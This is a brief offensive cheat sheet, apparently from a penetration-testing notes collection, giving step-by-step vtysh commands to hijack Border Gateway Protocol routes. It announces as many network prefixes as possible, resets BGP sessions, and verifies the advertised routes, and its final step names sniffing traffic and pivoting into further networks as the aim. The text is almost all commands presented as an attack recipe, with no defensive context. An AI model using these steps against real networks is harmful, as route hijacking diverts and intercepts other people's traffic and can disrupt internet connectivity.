# Border Gateway Protocol Hijacking (BGP)

### STEPS/COMMANDS:

#### 1) Run BGP config shell

    vtysh

#### 2) 

    config terminal

#### 3) 

    router bgp NUM

#### 4) You can try to route as many networks as you can find

    network HOST/CIDR

#### 5) 

    end

#### 6) 

    clear ip bgp *

#### 7) Check on the route

    show ip bgp neighbors YOUR_IP advertised-routes 

#### 8) Now you can sniff network traffic, or pivot further through more networks!
